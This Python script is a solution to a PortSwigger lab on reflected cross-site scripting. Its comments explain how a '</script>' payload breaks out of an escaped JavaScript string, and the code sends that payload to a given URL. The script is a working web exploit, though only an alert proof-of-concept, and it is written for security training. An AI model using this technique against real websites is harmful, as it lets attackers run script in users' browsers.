# Lab 21 — Reflected XSS into a JS string with single quote and backslash escaped
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
#
# Vulnerability: Search — JS string, ' → \' and \ → \\
# Aim:           Call alert by escaping the <script> block entirely
#
# Technique:
#   The server escapes both ' and \ so we can't break out of the JS string.
#   But the input is inside a raw <script> block in the HTML:
#     <script>var x = 'INPUT';</script>
#
#   The HTML parser and JS parser run separately.
#   Inject </script> → the HTML parser closes the block immediately,
#   regardless of JS string context.
#   Then open a new <script> block with our payload:
#
#     Input:  </script><script>alert(1)//
#     Result:
#       <script>var x = '</script>    ← HTML parser closes here
#       <script>alert(1)//';</script> ← new script block executes
#
#   The JS parser never sees the broken string — it's the HTML parser's job
#   to close the block, and it doesn't care about JS string context.
#
# Usage: python xss_lab21.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "</script><script>alert(1)//"

if __name__ == "__main__":
    banner()
    section("LAB 21 — REFLECTED XSS: JS STRING, SINGLE QUOTE + BACKSLASH ESCAPED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab21.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "Script-termination payload")

    print()
    print("  ➜  Open this URL in a browser:")
    print(f"     {r.url}")
    print("  ℹ  HTML parser sees </script> and closes the block — JS context irrelevant.")
    print("     The new <script>alert(1) tag executes cleanly.")
